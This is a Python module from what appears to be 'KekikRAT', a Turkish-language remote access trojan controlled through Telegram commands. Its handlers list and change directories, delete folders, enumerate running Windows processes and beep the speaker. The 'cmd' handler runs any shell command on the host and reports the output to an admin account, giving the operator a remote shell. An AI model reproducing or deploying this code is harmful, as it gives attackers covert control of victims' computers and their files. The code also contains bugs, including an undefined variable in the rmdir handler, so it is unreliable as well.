#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

from pyrogram import Client, Filters
from KekikRAT import adminID
import os

@Client.on_message(Filters.command(['pwd'], ['!','.','/']))
def pwd(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `pwd` Komutunu Verdi!\n\n"

    cwd = os.path.abspath(os.getcwd())

    mesaj += f"{cwd}"
    kekik.edit(mesaj)

@Client.on_message(Filters.command(['ls'], ['!','.','/']))
def ls(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `ls` Komutunu Verdi!\n\n"

    listDir = os.listdir()
    for eleman in listDir:
        mesaj += f"`{eleman}`\n"

    #mesaj += f"{listDir}"
    kekik.edit(mesaj)

@Client.on_message(Filters.command(['cd'], ['!','.','/']))
def cd(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `cd` Komutunu Verdi!\n\n"

    girilenYazi = message.text
    gidilecekDizin = " ".join(girilenYazi.split()[1:2])
    os.chdir(gidilecekDizin)

    mesaj += f"Şu Şekilde Değişti :\n{os.getcwd()}"
    kekik.edit(mesaj)

@Client.on_message(Filters.command(['rmdir'], ['!','.','/']))
def rmdir(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `rmdir` Komutunu Verdi!\n\n"

    girilenYazi = message.text
    silinecekDizin = " ".join(girilenYazi.split()[1:2])
    os.removedirs(silinecekDizin)

    mesaj += f"Bu Klasör: `{silinecek_dizin}` silindi.."
    kekik.edit(mesaj)

@Client.on_message(Filters.command(['tasks'], ['!','.','/']))
def tasks(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `tasks` Komutunu Verdi!\n\n"

    liste = os.popen('tasklist /FI \"STATUS ne NOT RESPONDING\"')
    response = ""

    kayit = []

    for eleman in liste:
        eleman.replace('\n\n', '\n')
        if len(eleman.split()) == 6:
            if eleman.split()[0].endswith(".exe") and eleman.split()[0] not in kayit:
                kayit.append(eleman.split()[0])
                response += f"`{eleman.split()[0]}`" + "\n"

    mesaj += response
    mesaj += f"\nÇalışan Program Sayısı : `{len(response.split())}`"

    kekik.edit(mesaj)

@Client.on_message(Filters.command(['bip'], ['!','.','/']))
def bip(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `bip` Komutunu Verdi!\n\n"

    import winsound
    import random

    for i in range(1, 5):
        winsound.Beep(random.randint(57, 767), 1000)

    mesaj += "Hallettim !"
    kekik.edit(mesaj)

@Client.on_message(Filters.command(['cmd'], ['!','.','/']))
def cmd(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `cmd` Komutunu Verdi!\n"

    girilenYazi = message.text
    if len(girilenYazi.split()) == 1:
        kekik.edit("`komut` Girmelisiniz")
        return

    komut = " ".join(girilenYazi.split()[1:])
    mesaj += (f"\tDeniyorum : `{komut}`\n\n")

    if os.popen(komut).read():
        mesaj += os.popen(komut).read()
        mesaj += "\nBu kadar :)"
    else:
        mesaj += "\nOlmadı :)"

    kekik.edit(mesaj)